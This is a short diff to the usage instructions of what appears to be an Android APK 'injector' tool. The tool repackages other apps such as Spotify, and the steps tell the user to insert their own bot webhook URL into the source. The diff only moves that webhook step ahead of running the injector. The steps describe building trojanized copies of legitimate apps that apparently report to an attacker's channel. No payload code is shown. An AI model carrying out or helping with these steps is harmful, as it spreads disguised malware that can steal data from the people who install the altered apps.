@@ -51,13 +51,13 @@ Inject.rar in the builders release section
 
 injector does not work on all apps (works on spotify and a few more)
 
+open the Source folder in VS code and search and replace all for 2 instances of "INSERT-WEBHOOK-URL-FROM-YOUR-CHANNEL-BOT" with your own bot token
+
 run: python -m inject
 
 place the apk you want to inject into the apk folder
 
 click inject, wait for it to stop hanging, it's done when there exists text in the box
-
-open the output folder in VS code and search and replace all for 2 instances of "INSERT-WEBHOOK-URL-FROM-YOUR-CHANNEL-BOT" with your own bot token
 
 click on inject 
 
